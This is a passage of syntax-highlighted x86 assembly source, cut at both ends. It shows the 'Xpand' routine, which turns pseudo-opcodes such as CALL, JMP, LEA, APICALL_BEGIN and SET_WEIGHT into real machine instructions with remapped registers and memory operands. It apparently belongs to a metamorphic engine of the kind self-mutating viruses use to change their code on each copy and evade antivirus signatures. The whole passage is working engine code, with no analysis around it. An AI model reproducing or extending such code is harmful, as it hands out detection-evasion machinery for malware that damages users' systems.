                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; memory address.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNEGMem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next016</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">              </span><span class="sc1">; CALL @xxx?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next017</span><span class="sc0">
   </span><span class="sc5">@@CopyInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Then copy the instruction.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; It's one of the very few that</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; haven't a translation.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next017</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">              </span><span class="sc1">; JMP @xxx?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next018</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get the label, set it in the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; work field and generate the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJMP</span><span class="sc0">               </span><span class="sc1">; JMP instruction.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next018</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">              </span><span class="sc1">; CALL Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next019</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; Set "32 bits" usage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Translate indexes and copy</span><span class="sc0">
                                               </span><span class="sc1">; the operands</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenCALLMem</span><span class="sc0">          </span><span class="sc1">; Generate a CALL Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next019</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">              </span><span class="sc1">; JMP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next020</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set "32 bits"</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Translate and set the memory</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJMPMem</span><span class="sc0">           </span><span class="sc1">; address and generate the JMP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next020</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0">           </span><span class="sc1">; CALL Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next021</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Set "32 bits"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetRegister</span><span class="sc0">   </span><span class="sc1">; Translate and set the register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenCALLReg</span><span class="sc0">       </span><span class="sc1">; Generate the CALL Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next021</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc0">           </span><span class="sc1">; JMP Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next022</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Set "32 bits"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetRegister</span><span class="sc0">   </span><span class="sc1">; Translate and set the register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJMPReg</span><span class="sc0">        </span><span class="sc1">; Generate the JMP Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next022</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">           </span><span class="sc1">; SHIFT Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next023</span><span class="sc0">
   </span><span class="sc5">@@Xpand_TranslateReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Translate the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CopyInstruction</span><span class="sc0">     </span><span class="sc1">; Copy the instruction</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next023</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F2h</span><span class="sc0">           </span><span class="sc1">; SHIFT Reg8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Xpand_TranslateReg</span><span class="sc0">  </span><span class="sc1">; Then jump to translate et all</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next024</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F1h</span><span class="sc0">           </span><span class="sc1">; SHIFT Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next025</span><span class="sc0">
   </span><span class="sc5">@@Xpand_TranslateMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Translate the memory address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; and copy the instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next025</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F3h</span><span class="sc0">          </span><span class="sc1">; SHIFT Mem8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Xpand_TranslateMem</span><span class="sc0"> </span><span class="sc1">; Then do the same as with Mem32</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next026</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F4h</span><span class="sc0">          </span><span class="sc1">; APICALL_BEGIN?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next027</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Set "32 bits"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Generate a PUSH EAX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Generate a PUSH ECX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Generate a PUSH EDX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next027</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F5h</span><span class="sc0">         </span><span class="sc1">; APICALL_END?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next028</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Set "32 bits"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Generate a POP EDX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Generate a POP ECX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPReg</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Generate a POP EAX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next028</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">          </span><span class="sc1">; APICALL_STORE?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next029_</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set EAX as destiny register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Translate the memory address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">               </span><span class="sc1">; Set a MOV instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set "32 bits" usage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">         </span><span class="sc1">; Generate a MOV Reg,[Mem]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next029_</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">          </span><span class="sc1">; MOVZX Reg,byte ptr [Mem]?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next029</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Translate the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Translate and copy the mem.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenMOVZX</span><span class="sc0">            </span><span class="sc1">; address and generate a MOVZX</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next029</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">          </span><span class="sc1">; LEA?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next030</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0">  </span><span class="sc1">; Then translate and copy the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; memory address, do the same</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">               </span><span class="sc1">; with the destiny register,</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0"> </span><span class="sc1">; set "32 bits" register and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; generate the LEA,</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenLEA</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next030</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">          </span><span class="sc1">; RET?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next031</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenRET</span><span class="sc0">          </span><span class="sc1">; Then generate a RET</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next031</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">          </span><span class="sc1">; NOP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">             </span><span class="sc1">; Then avoid it</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next032</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">          </span><span class="sc1">; SET_WEIGHT?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next033</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_MakeSET_WEIGHT</span><span class="sc0">
